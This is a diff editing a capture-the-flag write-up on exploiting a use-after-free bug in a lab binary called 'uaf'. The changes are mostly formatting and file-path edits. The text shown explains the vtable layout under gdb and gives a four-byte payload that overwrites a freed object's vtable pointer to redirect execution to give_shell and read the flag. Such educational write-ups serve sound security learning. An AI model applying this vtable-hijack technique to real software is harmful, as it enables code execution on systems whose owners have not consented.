@@ -108,7 +108,7 @@ $ gdb uaf
 [...]
 ```
 
-The first 7 lines are for m->introduce(), while the last 7 are for w->introduce().
+The first 7 lines are for `m->introduce()`, while the last 7 are for `w->introduce()`.
 What's going on here?
 
 Well, the first line puts the object into `rax`. The first member of the object, in this implementation, is the pointer to the vtable. The second line puts the vtable into `rax`. It then adds `0x8` to it because that's the offset between the first member of the vtable and `introduce`.
@@ -149,11 +149,12 @@ Now let's try to free the objects, allocate 4 bytes and see what happens to the 
 We now know the parameters are going to be put into `rdi`, `rsi`, `rdx`, [...], in this order. The second parameter of `read` is the destination, thus we need to check `rsi`.
 
 ```bash
-$ echo -en "\x00\x00\x00\x00" > bytes
+$ mkdir /tmp/uaf
+$ echo -en "\x00\x00\x00\x00" > /tmp/uaf/bytes
 $ gdb uaf
 >>> b *main+399
 Breakpoint 1 at 0x401053
->>> r 4 bytes
+>>> r 4 /tmp/uaf/bytes
 1. use
 2. after
 3. free
@@ -196,11 +197,11 @@ Let's check what's in Man's vtable:
 ```
 
 But what is it that we have to write to the pointer to the vtable in order to redirect execution to `give_shell`?
-If we write `0x00401570`-`0x8` (`0x00401568`) to `0x614c50`, vtable + 0x8 is going to point to `give_shell` and we can get our flag:
+If we write `0x00401570`-`0x8` (`0x00401568`) to `0x614c50`, the address of the vtable + `0x8` is going to point to `give_shell` and we can get our flag:
 
 ```bash
-$ echo -en "\x68\x15\x40\x00" > payload
-$ ./uaf 4 payload
+$ echo -en "\x68\x15\x40\x00" > /tmp/uaf/payload
+$ ./uaf 4 /tmp/uaf/payload
 1. use
 2. after
 3. free
@@ -222,4 +223,4 @@ your data is allocated
 sh-4.4$ cat flag
 ```
 
-Also notice that you'll have to exit twice to come back to the menu loop, because Woman's call was also redirected to Man's give_shell entry. :)
+Also notice that we'll have to exit twice to come back to the menu loop, because Woman's call was also redirected to Man's give_shell entry. :)
